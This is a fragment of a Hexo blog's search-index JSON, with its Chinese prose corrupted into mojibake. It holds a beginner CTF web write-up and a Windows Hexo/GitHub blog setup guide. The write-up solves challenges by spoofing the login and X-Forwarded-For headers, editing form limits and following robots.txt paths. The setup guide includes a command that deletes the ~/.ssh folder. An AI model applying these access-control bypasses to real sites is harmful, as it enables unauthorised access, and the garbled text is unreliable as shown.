V2NscEhSbGROTW1oSlYxUkplRk14U1hoalJXUmhVbFJXVDFWc2FFTlRNVnAwVFZSQ1ZrMVZNVFJXYkdodlYwWmtTR0ZHYkZwaVdHaG9WbTE0YzJOc2NFaFBWM0JUWWtoQ05GWnJZM2RPVmxsNFYyNVNWbUpIYUZoV2FrNU9UVlphV0dNemFGaFNiRnA1V1ZWYWExUnRSbk5YYkZaWFlUSlJNRmRXV2t0ak1WSjFWRzFvVTJKR2NGbFhWM2hoVW0xUmVGZHVSbEppVlZwaFZtMHhVMU5XV2xoa1J6bG9UVlZ3TUZsVldsTldWbHBZWVVWU1ZrMXVhR2haZWtaM1VsWldkR05GTlZkTlZXd3pWbXhTUzAxSFNYbFNhMlJVWW1zMVZWbHJaRzlXYkZwMFpVaGtUazFXYkROV01qVkxZa1pLZEZWdWJHRlNWMUl6V1ZaYVlXTnRUa1ppUm1ScFVqRkZkMWRXVWt0U01WbDRWRzVXVm1KRlNsaFZiRkpYVjFaYVIxbDZSbWxOVjFKSVdXdG9SMVpIUlhoalNFNVdZbFJHVkZZeWVHdGpiRnBWVW14a1RsWnVRalpYVkVKaFZqRmtSMWRZY0ZaaWEzQllWbXRXWVdWc1duRlNiR1JxVFZkU2VsbFZaSE5XTVZwMVVXeEdWMkV4Y0doWFZtUlNaVlphY2xwR1pGaFNNMmg1VmxkMFYxTXhaRWRWYkdSWVltMVNjMVp0TVRCTk1WbDVUbGQwV0ZKcmJETldiWEJUVjJzeFIxTnNRbGROYWtaSFdsWmFWMk5zY0VoU2JHUk9UVzFvU2xZeFVrcGxSazE0VTFob2FsSlhhSEJWYlRGdlZrWmFjMkZGVGxSTlZuQXdWRlpTUTFack1WWk5WRkpYWWtkb2RsWXdXbXRUUjBaSFlrWndhVmRIYUc5V2JYQkhZekpOZUdORmFGQldiVkpVV1d4b2IxbFdaRlZSYlVab1RXdHdTVlV5ZEc5V2JVcElaVWRvVjJKSFVrOVVWbHB6VmpGYVdXRkdhRk5pUm5BMVYxWldZV0V4VW5SU2JrNVlZa1phV0ZsVVNsSk5SbFkyVW10MGFrMVlRa3BXYlhoVFlWWktjMk5HYkZoV00xSm9Xa1JCTVdNeFpISmhSM2hUVFVad2FGWnRNSGhWTVVsNFZXNU9XR0pWV2xkVmJYaHpUbFpzVm1GRlRsZGlWWEJKV1ZWV1QxbFdTa1pYYldoYVpXdGFNMVZzV2xka1IwNUdUbFprVGxaWGQzcFdiWGhUVXpBeFNGTlliRk5oTWxKVldXMXpNVlpXYkhKYVJ6bFhZa1p3ZWxZeU5XdFVhekZYWTBoc1YwMXFSa2haVjNoaFkyMU9SVkZ0UmxOV01VWXpWbTF3UzFNeVRuTlVia3BxVW0xb2NGVnRlSGRsVm1SWlkwVmtWMkpXV2xoV1J6VlBZVlpLZFZGck9WVldla1oyVmpGYWExWXhWbkphUjNST1lURndTVlpxU2pSV01WVjVVMnRrYWxORk5WZFpiRkpIVmtaU1YxZHNXbXhXTURReVZXMTRhMVJzV25WUmFscFlWa1ZLYUZacVJtdFNNV1IxVkd4U2FFMXRhRzlXVjNSWFdWZE9jMVp1UmxSaE0xSlZWbTE0UzAxR2JGWlhhemxYVFZad1NGWXljRXRXTWtwSVZHcFNWV0V5VWxOYVZscGhZMnh3UjFwR2FGTk5NbWcxVm14a2QxUXhWWGxUV0docFUwVTFXRmx0TVZOWFJsSlhWMjVrVGxKdGRETlhhMVpyVjBaSmQyTkZhRnBOUm5CMlZqSnplRk5HVm5WWGJHUk9ZbTFvYjFacVFtRldNazV6WTBWb1UySkhVbGhVVmxaM1ZXeGFjMVZyVG1oTlZXdzBWVEZvYzFVeVJYbGhTRUpXWWxoTmVGa3dXbk5XVmtaMVdrVTFhVkp1UVhkV1JscFRVVEZhY2sxV1drNVdSa3BZVm01d1YxWkdXbkZUYTFwc1ZteGFNVlZ0ZUdGaFZrbDRVbGhrVjJKVVJUQlpla3BPWlVkT1JtRkdRbGRpVmtwVlYxZDBWMlF4WkhOWGEyaHNVak5DVUZadGVITk9SbGw1VGxaT1YySlZjRWxaVlZwdlZqSkdjazVWT1ZWV2JIQm9WakJrVG1WdFJrZGhSazVwVW01Qk1sWXhXbGRaVjBWNFZXNU9XRmRIZUc5VmExWjNWMFpTVjFkdVpHaFNiRmt5VlcxME1HRnJNVmRUYWtaWFZqTm9VRmxXV2twbFJrNTFXa1prYUdFd2NGaFdSbFpXWlVaSmVGcElTbWhTTTFKVVZGVmFkMlJzV2tkYVNIQk9WakZhZWxZeGFITlVNVnB5VGxjNVZWWnNXak5VVlZwaFYwVTFWbFJzWkU1aE0wSktWMVpXVjFVeFdsaFRiR3hvVWpKb1dGbHJXbmRWUmxwelYydDBhazFXY0hsVWJGcHJZVmRGZDFkWWNGZGlXR2h4V2tSQmVGWXhVbGxoUm1ob1RXMW9WbGRYZEd0aU1rbDRWbTVHVW1KVldsaFphMXAzVFVad1ZtRkhkRlZoZWtaYVZWZDRjMWxXV2xoaFJYaGFZVEZ3WVZwVldtdGpiVTVIWVVkb1RsZEZTbEpXYlRGM1V6RktkRlpyYUZWaE1WcFlXV3RrVTFaR1ZuTlhibVJzVm0xU1dsa3dWbXRXTWtwWFVtcE9WVlpzV25wWlZscEtaVmRHUjFWc2NHbFNNbWd5Vm1wR1lXRXhaRWhXYTJoUVZtdHdUMVpzVWtaTlJtUlZVVzFHV2xac2JEUlhhMVp2WVVaS2MxTnNXbGRpVkVaVVZtdGFkMWRIVmtsVWJHUnBVakZLTmxaclkzaGlNVmw1VWxod1VsZEhhRmhXYlRGU1RVWndSVkpzY0d4V2F6VjZXV3RhWVdGV1NYbGhSemxYVmpOU1dGZFdaRTlqTVZwMVVteFNhRTB4U2xaV2JURjZUVlV4UjFadVVteFNWR3h3VldwQ2QxZHNiRlpWYkU1WFRVUkdXVlpXYUd0WFJscDBWV3hPWVZac2NHaFpNbmgzVWpGd1IyRkdUazVOYldjeFZtMTRhMlF4UlhoaVJtaFZZVEpTV0ZsdGVFdGpNVlYzV2taT2FrMVhlSGxXTWpWUFZERmFkVkZzWkZwV1YxRjNWakJhUzJOdFNrVlViR1JwVjBWS1ZWWnFTbnBsUmtsNFZHNU9VbUpIVWs5WlYzUmhVMFprYzFkdFJsZE5helY2V1RCV2IxVXlTa2hWYXpsVlZucEdkbFV5ZUZwbFJsWnlZMGQ0VTJGNlJUQldWRVp2WWpKR2MxTnNhRlppVjJoWFdXdGFTMWRHV2tWU2JHUnFUV3RhUjFaSGVGTlViRnAxVVZoa1YxSnNjRlJWVkVaaFkyc3hWMWRyTlZkU2EzQlpWMWQwYTJJeVVuTlhXR1JZWWxoU1ZWVnFRbUZUVm14V1YyMUdWV0pGY0RGVlZ6QTFWakpLVlZKVVFscGxhM0JRV1hwR2QxTldUblJrUms1T1RVVndWbFl4WkRCaU1VVjNUbFZrV0dKcmNHRlVWRXBUVlVaYWRHVklUazlTYkd3MVZHeFZOV0ZIU2taalJteGFWbFp3ZWxacVNrWmxSbHBaWVVkR1UwMHlhRFpXYlhCSFdWWmtXRkpyWkdoU2F6VndWVzAxUWsxc1dYaFhiR1JhVmpCV05GWlhOVTlYUm1SSVpVYzVWbUV4V2pOV01GcFRWakZrZFZwSGFGTmlSbXQ1VmxjeE1FMUhSbkpOVm1SVVlXdGFXRlpxVG05U1JscHhVMnQwVTAxck5VaFphMXB2VmpBd2VGTnFTbGRXYkVwSVZsUkdXbVZIVGtaaVJsWnBVakpvZDFadGVHRmtNV1JIVjJ0a1dHSlZXbkZVVlZKWFUwWlplR0ZJVGxWTlZuQjVWR3hqTlZaV1duTlhibkJWWWtad2VsWnRNVWRTYkZKeldrZHNWMWRGU2t0V01WcFhWakZWZUZkWVpFNVdiVkp4VldwS2IxbFdVbGRYYm1SV1VtMTBORll5ZUd0aGF6RllWVzVzVldKR2NISldSM2hoVjBkUmVtTkdaR2xYUjJoVlZsaHdRbVZHVGtkVWJHeHBVbXMxYjFSWGVFdFdiR1JZVFZod1RsWnNjRmhaYTJoTFdWWktObUpHYUZwaE1YQXpXbGQ0V21WVk5WaGtSbFpvWld0YVdsZHNWbUZoTVZsM1RWaEdWMkpyY0ZoV2ExWjNWRVpWZUZkclpHcGlWVnBJVjJ0YVQxUnJNWFJoUmxwWFlsUkdNMVY2Ums1bFZsSjFWR3hXYVdFelFuWldWekI0VlRGYVIxVnNWbFJpVkd4d1ZGWmFkMlZXV2xoa1JFSldUVVJHV1ZaWGRHOVdhekYxWVVod1dGWnNjRXRhVjNoSFl6RldjMXBIYUdobGJGbDVWbTF3UjFsWFJYaGFSV2hYWVRKb1VWWnRkSGRVTVZwMFpFaGtWRlp0VWxaVlZ6RkhZVlV4Y2xkcVFsZGlWRlpNVmpCa1MxTkhWa2RhUm5CcFVqSm9WVlpHVWtka01WbDRXa2hTYTFJelFuQlZha1pLWkRGYVJWSnRkR2xOVm13elZGWldhMkZGTUhsbFJtaGFZa1pLUTFwVlduTmpWa3B6WTBkNFUySldTalZXYWtvMFZUSkdXRk5yYkZKaVIyaFlXV3hvVTFkR1pGZGFSbVJxVFZkU01WVnRlRTloVmtsNFUyNW9WMUpzY0hKV1ZFcFhZekpLUjFkdFJsUlNWRloyVm0weE5HUXlWbGRoTTJSV1lsVmFXRlJWVWtkWFZscFhZVWQwV0ZKc2NEQldWM2hQV1ZaYWMyTkhhRnBOYm1nelZXcEdkMUl5UmtkVWF6Vk9ZbGRqZUZadE1UUmhNREZIVjFob1ZWZEhhR2hWYkdSVFZqRnNjbHBHVGxoV2JYZ3dWRlphVDJGck1WZGpSRUpoVmxkb1VGWkVSbUZrVmtaeldrWndWMVl4UmpOV2FrSmhVMjFSZVZScldtaFNia0pQVlcwMVEwMXNXbkZUYm5Cc1VtczFTVlZ0ZEdGaVJrcDBWV3M1V21KVVJuWlpha1poWTFaR2RGSnNaRTVoZWxZMlYxUkNWMkl4VlhsVGEyaFdZa2RvVmxadGVHRk5NVnBZWlVkR2FrMVdXbmxXUjNocllVZFdjMWRzYkZkaGExcDJXV3BLUjJNeFRuTmhSMmhUWlcxNFdGZFdaREJrTWxKelYydFdVMkpHY0hKVVZscDNaVlp3UmxaVVJtaFdhM0F4VlZab2ExZEhTa2RYYmtaVllrZFNSMXBFUVhoV01XUnlUbFprVTJFelFscFdiVEIzWlVkSmVWVnVUbGhYUjFKWldXeG9VMVpXVm5GUmJVWlVZa1phTUZwVlpFZGhSbHB5WWtSU1ZtSkhhSEpXYWtwTFZsWktWVkZzY0d4aE0wSlFWMnhXWVdFeVVsZFdiazVWWWxkNFZGUldWbmRXYkZsNFdrUkNWMDFzUmpSWGEyaFBWMGRGZVdGSVRsWmhhelZFVmxWYVlXUkZNVmRVYkZKVFlrZDNNVlpIZUZaT1YwWklVMnRhYWxKRlNtaFdiR1JUVTBaYWMxZHRSbGROYXpWSVYydGFWMVl5U2tsUmFscFhZbGhDU0ZkV1dtdFhSa3B5WVVkd1UwMXVhRmxXYWtKWFV6Rk9SMWR1VW14U00xSlFWV3BDVjA1R1dsaE9WazVXVFd0d2VWUnNXbk5YYlVWNFkwZG9WMDFXY0doYVJWVjRWakZPY2s1V1RtbFNiWFExVm14amQyVkdTWGxTYmxKVFlXeHdXRmxyWkc5WlZteFZVbTVrVlZKdGVGaFdNblF3WVdzeGNrNVZhRnBoTVhCMlZtcEJkMlZHVG5SUFZtaG9UVlZ3U1ZkV1VrZFhiVlpIWTBWc1ZHSlhhRlJVVkVaTFZsWmFSMVp0Um10TlYxSllWakowYTFsV1RrbFJiazVXWWtaS1dGWXdXbUZrUlRWWFZHMW9UbFpYT0hsWFYzUmhZVEZhZEZOc2JHaFRTRUpXV1d0YWQyVnNXblJOVldSVFlrWktlbGRyWkhOV01XUkdVMnQwVjAxV2NGaFdha1pXWlVaa1dWcEZOVmRpVmtwNFZsZHdTMkl4YkZkVmJHUllZbTFTVjFWdE1UQk9SbGw1WlVkMGFHRjZSbGxXVnpWelZsZEtSMk5JU2xkU00yaG9WakJrVW1WdFRrZGFSMnhZVWpKb1ZsWnNhSGRSYlZaSFZHdGtWR0pIZUc5VmFrSmhWa1phY1ZOdE9WZGlSMUpaV2tWa01HRlZNWEppUkZKWFlsUldWRlpIZUdGT2JVcElVbXhrYVZkSFozcFhiRnBoV1ZkU1JrMVdXbUZTYkZwdldsZDBZVmRzWkhOV2JVWm9UVlpzTTFSV2FFZFdNa3B5WTBab1YyRXhXak5XUlZwV1pVWmtjbHBIY0dsV1ZuQkpWakowWVZReFVuSk5XRkpvVW14d1dGbHNVa2ROTVZZMlVtczFiRlpzU2pGV1IzaFhZVmRGZWxGdWFGZFdla0kwV1dwS1QxSXhXblZWYlhoVVVqRktkMVpHV210Vk1XUkhWMnhvYTFKRlNsZFVWVkpIVjBac2NsVnNUbGROVld3MldWVm9kMWRzV1hwaFJYaGhVbXh3U0ZreWN6VldNVnB6V2tkNGFFMVhPVFZXYlRGM1VqRnNWMkpHWkZSWFIyaHdWV3RhZDFaR2JITmFSRkpWVFZad2VGVnRkREJXUmxwelkwaG9WazFXU2toV1ZFRjRWakZhY1Zac1drNWliRXB2VjFaa05GUXhTbkpPVm1SaFVtNUNjRlZ0ZEhkVFZscDBaRWRHV0dKV1dsbFdiWFJ2WVRGSmVsRnVRbFppVkZaRVZtcEdZVmRGTVZWVmJXeE9WbXhaTVZaWGVHOWtNVlowVTJ4YVdHSkhhRmhaYkZKSFZURlNWbGR1VGs5aVJYQXdXa1ZhVDFSc1dYaFRXR2hYWWtkUk1GZFdaRWRUUms1eVlrWkthVkl4U2xsWFYzaFRVbXN4UjJORlZsUmlSMUp4VkZaa1UwMVdWblJsUlRsb1ZtdHNORlV5Tlc5V01VcHpZMGhLVjFaRmNGaFpla3BMVWpGa2RGSnNVbE5XUmxveVZtMHdlRTVIVVhsV2JHUm9UVEpTV1ZsdE1WTlhSbEpZWkVoa1ZGWnNjRWxaTUZwUFZqRlpkMVpxVmxkV00yaFFWMVphWVdNeVRraGhSbkJPWW0xbmVsWlhjRWRrTVU1SVUydG9hVkpyTlZsVmJGWjNWVEZhZEUxSVpHeFNWRlpKVld4b2IxWXhaRWhoUjJoV1lrZFNWRlpxUm5OamJHUjFXa1prVGxZemFGZFdWRW8wVkRKR2NrMVdaR3BTUlVwb1ZteGFXbVF4YkhKYVJYUlRUV3MxUmxWWGVGZFdNVnB5WTBac1YySllRa05hVlZwTFZqRk9kVlJ0UmxOaWEwcDNWMWN4TUZNeFVsZFhibEpPVTBkb1ZWUldaRk5YUmxwMFRsWmtXRkl3Y0VsV1Z6QTFWMnhhUmxkcVRscGhhMXBvVmpCVmVGWldWblJoUlRWb1pXeFdNMVp0TUhoTlIwVjRZa1prVkZkSGVHOVZibkJ6Vm14YWNsWnJkRlZTYkhCWldsVmtSMkZyTVZoa1JGcGFWbFpWTVZaVVNrdFhWMFpIWTBaa2FFMVlRakpYVjNCTFVqSk5lRlJ1VG1oU01taFZWV3hXZDFkR1pGaGxSemxWWWxaYVNGWXlkRmRWTWtwV1YyNUdWVlp0VWxSYVYzaHlaREZ3UlZWdGFGZGhNMEY0VmxaYWIyRXhaRWhUYTJSWVltdHdWMWxYZEdGaFJtdDVZek5vVjAxWFVqQlphMXBQVlRKRmVsRnRPVmROVm5CVVZXcEtVbVZXVW5WVWJHaFlVakZLYjFaWGVHOVZNazVYWWtoT1YxWkZXbFJVVmxwSFRrWlplVTFVUW1oU2JIQXdWbGQwYzFkSFJuSk9WRTVYWVd0d1NGa3llRTlrUjBaSFkwZDRhRTFZUWpWV2JYQkRXVlpWZVZSdVRtcFNWMmhVV1d0Vk1XTkdXblJrU0dSWFlrWnNORmRyVWtOWGJGbDRVbXBPVldKR2NISldNR1JMWXpGT2NrOVdaR2hOVm5CTlZqRmFZVmxYVWtoV2ExcGhVbFJzVkZscmFFSmtNV1J6Vm0xR2FFMVdjRmxWTW5SaFlXeEtXR1ZIUmxWV1JUVkVXbFphVjFJeFNsVmlSa1pXVmtSQk5RPT0= base64è§£ç ï¼Œpythonå¼•ç”¨base64åº“å†™è„šæœ¬(å…±ç»è¿‡äº†20æ¬¡è§£ç ) 12345678import base64s = input()try: while True: s = base64.decodestring(s)except Exception: print s ç¬¬å››é¢˜æ®è¯´MD5åŠ å¯†å¾ˆå®‰å…¨ï¼ŒçœŸçš„æ˜¯ä¹ˆï¼Ÿåˆ†å€¼: 200e0960851294d7b2253978ba858e24633 ç¬¬äº”é¢˜ç§æ—æ­§è§†åˆ†å€¼: 300å°æ˜åŒå­¦ä»Šå¤©è®¿é—®äº†ä¸€ä¸ªç½‘ç«™ï¼Œç«Ÿç„¶ä¸å…è®¸ä¸­å›½äººè®¿é—®ï¼å¤ªå‘äº†ï¼Œäºæ˜¯å°æ˜åŒå­¦å†³å¿ƒä¸€å®šè¦è¿›å»ä¸€æ¢ç©¶ç«Ÿï¼é€šå…³åœ°å€ ç¬¬å…­é¢˜HAHAæµè§ˆå™¨åˆ†å€¼: 200æ®è¯´ä¿¡æ¯å®‰å…¨å°ç»„æœ€è¿‘å‡ºäº†ä¸€æ¬¾æ–°çš„æµè§ˆå™¨ï¼Œå«HAHAæµè§ˆå™¨ï¼Œæœ‰äº›é¢˜ç›®å¿…é¡»é€šè¿‡HAHAæµè§ˆå™¨æ‰èƒ½ç­”å¯¹ã€‚å°æ˜åŒå­¦åšå†³ä¸è¦è£…HAHAæµè§ˆå™¨ï¼Œæ€•æœ‰åé—¨ï¼Œä½†æ˜¯å¦‚ä½•æ‰èƒ½è¿‡è¿™ä¸ªéœ€è¦å®‰è£…HAHAæµè§ˆå™¨æ‰èƒ½è¿‡çš„é¢˜ç›®å‘¢ï¼Ÿé€šå…³åœ°å€ ç¬¬ä¸ƒé¢˜keyç©¶ç«Ÿåœ¨å“ªé‡Œå‘¢ï¼Ÿåˆ†å€¼: 200ä¸Šä¸€æ¬¡å°æ˜åŒå­¦è½»æ¾æ‰¾åˆ°äº†keyï¼Œæ„Ÿè§‰è¿™ä¹ˆç®€å•çš„é¢˜ç›®å¤šæ— èŠï¼Œäºæ˜¯æœ‰äº†æ‰¾keyçš„åŠ å¼ºç‰ˆï¼Œé‚£ä¹ˆkeyè¿™æ¬¡ä¼šè—åœ¨å“ªé‡Œå‘¢ï¼Ÿé€šå…³åœ°å€ ç¬¬å…«é¢˜keyåˆæ‰¾ä¸åˆ°äº†åˆ†å€¼: 350å°æ˜è¿™æ¬¡å¯çœŸæ‰¾ä¸åˆ°keyå»å“ªé‡Œäº†ï¼Œä½ èƒ½å¸®ä»–æ‰¾åˆ°keyå—ï¼Ÿé€šå…³åœ°å€ æœ€åˆåˆ¤æ–­ä¸­é—´å¾ˆå¿«åœ°è·³è¿‡äº†ä¸€ä¸ªé¡µé¢ã€‚headersä¸­å‘ç°åŸæœ¬åº”è¯¥è½¬åˆ°key_is_here_now.phpï¼Œä½†é€šè¿‡locationè½¬åˆ°äº†index_no_key.phpï¼Œæ‹¼æ¥urlåæ‰¾åˆ°key ç¬¬ä¹é¢˜å†’å……ç™»é™†ç”¨æˆ·åˆ†å€¼: 200å°æ˜æ¥åˆ°ä¸€ä¸ªç½‘ç«™ï¼Œè¿˜æ˜¯æƒ³è¦keyï¼Œä½†æ˜¯å´æ€ä¹ˆé€—ç™»é™†ä¸äº†ï¼Œä½ èƒ½å¸®ä»–ç™»é™†å—ï¼Ÿé€šå…³åœ°å€ å°†headersä¸­çš„login=0æ”¹ä¸ºlogin=1å°±èƒ½å¾—åˆ°key ç¬¬åé¢˜æ¯”è¾ƒæ•°å­—å¤§å°åˆ†å€¼: 100åªè¦æ¯”æœåŠ¡å™¨ä¸Šçš„æ•°å­—å¤§å°±å¯ä»¥äº†ï¼é€šå…³åœ°å€ å°†ç½‘é¡µæºä»£ç ä¸­çš„maxlengthæ›´æ”¹åé‡æ–°æ‰“å¼€ç½‘é¡µè¾“å…¥å¤§äº999çš„æ•°å­—å¾—åˆ°key ç¬¬åä¸€é¢˜æœ¬åœ°çš„è¯±æƒ‘åˆ†å€¼: 200å°æ˜æ‰«æäº†ä»–å¿ƒçˆ±çš„å°çº¢çš„ç”µè„‘ï¼Œå‘ç°å¼€æ”¾äº†ä¸€ä¸ª80ç«¯å£ï¼Œä½†æ˜¯å½“å°æ˜å»è®¿é—®çš„æ—¶å€™å´å‘ç°åªå…è®¸ä»æœ¬åœ°è®¿é—®ï¼Œå¯ä»–å¿ƒçˆ±çš„å°çº¢ä¸æ•¢è®©è¿™ä¸ªè¯¡å¼‚çš„å°æ˜è§¦ç¢°å¥¹çš„ç”µè„‘ï¼Œå¯å°æ˜çœŸçš„æƒ³çŸ¥é“å°çº¢ç”µè„‘çš„80ç«¯å£åˆ°åº•éšè—ç€ä»€ä¹ˆç§˜å¯†(key)ï¼Ÿé€šå…³åœ°å€ X-Forwarded-Forç®€ç§°XFFå¤´ï¼Œå®ƒä»£è¡¨å®¢æˆ·ç«¯ï¼Œä¹Ÿå°±æ˜¯HTTPçš„è¯·æ±‚ç«¯çœŸå®çš„IPï¼Œåªæœ‰åœ¨é€šè¿‡äº†HTTP ä»£ç†æˆ–è€…è´Ÿè½½å‡è¡¡æœåŠ¡å™¨æ—¶æ‰ä¼šæ·»åŠ è¯¥é¡¹ã€‚å®ƒä¸æ˜¯RFCä¸­å®šä¹‰çš„æ ‡å‡†è¯·æ±‚å¤´ä¿¡æ¯ï¼Œåœ¨squidç¼“å­˜ä»£ç†æœåŠ¡å™¨å¼€å‘æ–‡æ¡£ä¸­å¯ä»¥æ‰¾åˆ°è¯¥é¡¹çš„è¯¦ç»†ä»‹ç»ã€‚æ ‡å‡†æ ¼å¼å¦‚ä¸‹ï¼šX-Forwarded-For: client1, proxy1, proxy2ã€‚ åœ¨headersä¸­æ·»åŠ X-Forwarded-Forï¼š127.0.0.1ï¼Œç„¶åå°±èƒ½åœ¨responseé‡Œå¾—åˆ°keyã€‚ ç¬¬åäºŒé¢˜å°±ä¸è®©ä½ è®¿é—®åˆ†å€¼: 150å°æ˜è®¾è®¡äº†ä¸€ä¸ªç½‘ç«™ï¼Œå› ä¸ºæ€»æ˜¯é­å—é»‘å®¢æ”»å‡»åå°ï¼Œæ‰€ä»¥è¿™æ¬¡ä»–æŠŠåå°æ”¾åˆ°äº†ä¸€ä¸ªæ— è®ºæ˜¯ä»€ä¹ˆäººéƒ½æ‰¾ä¸åˆ°çš„åœ°æ–¹â€¦.å¯æœ€åè¿˜æ˜¯è¢«é»‘å®¢æ‰¾åˆ°äº†ï¼Œå¹¶è¢«æ”¾ç½®äº†ä¸€ä¸ªé»‘é¡µï¼Œå†™åˆ°:find you ,no more than 3 secs!é€šå…³åœ°å€ Robotsåè®®ï¼ˆä¹Ÿç§°ä¸ºçˆ¬è™«åè®®ã€æœºå™¨äººåè®®ç­‰ï¼‰å…¨ç§°æ˜¯â€œç½‘ç»œçˆ¬è™«æ’é™¤æ ‡å‡†â€ï¼ˆRobots Exclusion Protocolï¼‰ï¼Œç½‘ç«™é€šè¿‡Robotsåè®®å‘Šè¯‰æœç´¢å¼•æ“å“ªäº›é¡µé¢å¯ä»¥æŠ“å–ï¼Œå“ªäº›é¡µé¢ä¸èƒ½æŠ“å–ã€‚ é€šè¿‡çˆ¬è™«åè®®å‘ç°æœ‰disallowçš„åœ°æ–¹ï¼Œå°±å°è¯•è¿›å»ã€‚åˆå‘ç°æœ‰æç¤ºlogin pageï¼Œå°±åŠ ä¸Šlogin.phpï¼Œå°±èƒ½å¾—åˆ°keyäº†","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://qianfei11.github.io/tags/ctf/"},{"name":"wp","slug":"wp","permalink":"https://qianfei11.github.io/tags/wp/"}]},{"title":"Windowsä¸‹åˆ©ç”¨hexoå’Œgithubæ­å»ºåšå®¢","slug":"Windowsä¸‹åˆ©ç”¨hexoå’Œgithubæ­å»ºåšå®¢","date":"2017-11-18T14:12:54.000Z","updated":"2018-07-01T02:09:38.385Z","comments":true,"path":"2017/11/18/Windowsä¸‹åˆ©ç”¨hexoå’Œgithubæ­å»ºåšå®¢/","link":"","permalink":"https://qianfei11.github.io/2017/11/18/Windowsä¸‹åˆ©ç”¨hexoå’Œgithubæ­å»ºåšå®¢/","excerpt":"è®°å½•ä¸‹åœ¨windowsä¸‹æ­å»ºåšå®¢çš„æ­¥éª¤ã€‚","text":"è®°å½•ä¸‹åœ¨windowsä¸‹æ­å»ºåšå®¢çš„æ­¥éª¤ã€‚ ä¸‹è½½å®‰è£…gitgitä¸‹è½½åœ°å€ ä¸‹è½½å®‰è£…node.jsnode.jsä¸‹è½½åœ°å€ githubè´¦å·æ³¨å†Œå’Œæ–°å»ºä»“åº“ä»“åº“åå¿…é¡»ä¸ºâ€œè´¦æˆ·å.github.ioâ€ï¼Œå‹¾é€‰â€œInitialize this repository with a READMEâ€ å®‰è£…hexoé€šè¿‡å‘½ä»¤è¡Œè¾“å…¥ 1npm install hexo -g æ³¨ï¼š-gæ˜¯æŒ‡å…¨å±€å®‰è£…hexoã€‚ å†è¾“å…¥ 1hexo -v æ£€æµ‹æ˜¯å¦å®‰è£…æˆåŠŸ åˆå§‹åŒ–Hexoåˆ›å»ºæ–‡ä»¶å¤¹æ ¹æ®ä¸ªäººçˆ±å¥½åœ¨æœ¬åœ°åˆ›å»ºåšå®¢æ–‡ä»¶å¤¹ï¼Œç”¨äºä¿å­˜åšå®¢çš„æœ¬åœ°æ–‡ä»¶ åˆå§‹åŒ–åœ¨Hexoæ–‡ä»¶ä¸‹ï¼Œå³é”®è¿è¡ŒGit Bashï¼Œè¾“å…¥å‘½ä»¤ï¼š 1hexo init åˆå§‹åŒ–æˆåŠŸåç”Ÿæˆçš„ä¸€äº›åˆ—æ–‡ä»¶ å†è¾“å…¥ 1npm install å®‰è£…æ‰€éœ€è¦çš„ç»„ä»¶ é…ç½®åœ¨_config.ymlï¼Œè¿›è¡ŒåŸºç¡€é…ç½® æœ¬åœ°æµè§ˆåšå®¢åˆ†åˆ«è¾“å…¥å¦‚ä¸‹å‘½ä»¤ï¼š 12hexo ghexo s åœ¨æµè§ˆå™¨è¾“å…¥ï¼šlocalhost:4000 ï¼Œå°±å¯ä»¥å¯¹æœ¬åœ°çš„åšå®¢è¿›è¡Œè®¿é—®ã€‚ å†™æ–‡ç« åœ¨åšå®¢æ–‡ä»¶å¤¹ä¸‹è¾“å…¥ 1hexo new post &quot;xxx&quot; å³èƒ½åˆ›å»ºæ–°åšæ–‡ï¼Œå£°ç§°åœ¨_postsæ–‡ä»¶å¤¹ä¸‹ æˆ–æ˜¯åœ¨_postsæ–‡ä»¶å¤¹ä¸‹ï¼Œæ–°å»º.mdæ–‡ä»¶å°±å¯ä»¥å†™æ–‡ç«  sshè®¾ç½®åœ¨åšå®¢æ–‡ä»¶å¤¹ä¸‹æ‰“å¼€git bashåï¼Œåˆ†åˆ«è¾“å…¥ 1git config --global user.name &quot;ä½ çš„åå­—&quot; å’Œ 1git config --global user.email &quot;ä½ çš„é‚®ç®±&quot; è¾“å…¥ 1cd ~/.ssh å†è¾“å…¥ 1ssh-keygen -t rsa -C &quot;ä½ çš„é‚®ç®±&quot; è¿ç»­ä¸‰ä¸ªå›è½¦ï¼Œç”Ÿæˆå¯†é’¥ å†è¾“å…¥ 1eval &quot;$(ssh-agent -s)&quot; ä»¥æ·»åŠ å¯†é’¥åˆ°ssh-agent å†è¾“å…¥ 1ssh-add ~/.ssh/id_rsa æ·»åŠ ç”Ÿæˆçš„SSH keyåˆ°ssh-agent ç„¶åç™»é™†githubï¼Œç‚¹å‡»å¤´åƒä¸‹çš„settingsï¼Œæ·»åŠ ä¸€ä¸ªæ–°çš„sshï¼Œå°†id_rsa.pubæ–‡ä»¶é‡Œçš„å†…å®¹å¤åˆ¶ä¸Šå» è¾“å…¥ 1ssh -T git@github.com å¦‚æœå‡ºç°â€œHi ä½ çš„åå­—â€ï¼Œè¯´æ˜æˆåŠŸäº† å‡å¦‚ssh-keyé…ç½®å¤±è´¥é¦–å…ˆï¼Œæ¸…é™¤æ‰€æœ‰çš„key-pair 12ssh-add -Drm -r ~/.ssh åˆ é™¤ä½ åœ¨githubä¸­çš„public-key é‡æ–°ç”Ÿæˆsshå¯†é’¥å¯¹ 1ssh-keygen -t rsa -C &quot;xxx@xxx.com&quot; éƒ¨ç½²åˆ°Githubåœ¨_config.ymlè¿›è¡Œé…ç½®deploy: type: git repository: git@github.com:ä½ çš„åå­—/ä½ çš„åå­—.github.io.git branch: master å®‰è£…hexo-deployer-gitè‡ªåŠ¨éƒ¨ç½²å‘å¸ƒå·¥å…·1npm install hexo-deployer-git --save å‘å¸ƒåˆ°Githubè¾“å…¥å¦‚ä¸‹å‘½ä»¤ï¼š 1hexo clean &amp;&amp; hexo g &amp;&amp; hexo d ç¬¬ä¸€æ¬¡å‘å¸ƒéœ€è¦éªŒè¯githubè´¦å·ã€‚ æµè§ˆå™¨æ‰“å¼€â€œä½ çš„åå­—.github.ioâ€ï¼Œå°±æ˜¯ä½ çš„åšå®¢äº† è¿™æ ·å°±å®Œæˆäº†ç®€å•çš„æ­å»ºã€‚","categories":[],"tags":[{"name":"hexo","slug":"hexo","permalink":"https://qianfei11.github.io/tags/hexo/"},{"name":"github","slug":"github","permalink":"https://qianfei11.github.io/tags/github/"},{"name":"windows","slug":"windows","permalink":"https://qianfei11.github.io/tags/windows/"}]}]}